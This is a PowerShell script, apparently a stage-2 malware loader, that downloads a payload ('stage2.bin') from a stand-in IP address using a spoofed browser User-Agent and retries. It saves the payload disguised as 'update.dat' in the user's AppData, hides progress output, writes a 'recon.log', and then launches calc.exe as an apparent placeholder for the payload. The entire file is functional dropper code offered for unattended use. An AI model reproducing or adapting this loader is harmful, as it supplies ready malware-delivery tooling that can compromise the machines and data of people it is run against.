
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://192.0.2.222:8080/cdn/stage2.bin',
    [string]$LocalPath = "$env:APPDATA\update.dat",
    [string]$ActivityLog = "$env:TEMP\recon.log",
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$ConnectionTimeout = 132,
    [int]$RetryAttempts = 3,
    [int]$RetryDelaySeconds = 13
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $ActivityLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$RetryCount = 3,
        [int]$RetryDelay = 13,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

Write-StageLog -Message "Starting stage 2 download"
$ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $FetchUrl
$FetchResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $LocalPath -RetryCount $RetryAttempts -RetryDelay $RetryDelaySeconds -UserAgent $UserAgent
if ($FetchResult) {
    Write-StageLog -Message "Stage 2 downloaded"
    Start-Process -FilePath "calc.exe"
}
else {
    Write-Warning "Stage 2 transfer did not complete"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $FetchUrl
    Destination = $LocalPath
    RetryCount = $RetryAttempts
    TimeoutSec = $ConnectionTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Retry budget remaining"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Stage handoff finished"
Write-Verbose "Reading configuration values"
$ProgressPreference = "SilentlyContinue"
Start-Sleep -Seconds 8
